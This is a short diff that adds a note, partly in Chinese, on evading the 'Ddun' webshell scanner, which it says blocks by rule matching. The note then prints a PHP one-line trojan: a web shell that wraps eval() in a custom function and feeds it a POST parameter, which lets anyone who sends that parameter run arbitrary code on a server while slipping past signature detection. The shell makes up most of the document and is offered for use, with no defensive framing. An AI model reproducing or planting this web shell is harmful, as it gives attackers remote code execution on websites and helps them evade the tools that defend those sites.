@@ -1,0 +1,4 @@
+how to bypass Ddun,this is a good question
+匹配规则库进行拦截
+一句话木马：
+<?php $a ="www.yuag.com"; function yuag($a){ echo eval($a); } @ yuag($_POST['yuag']); print "$a";
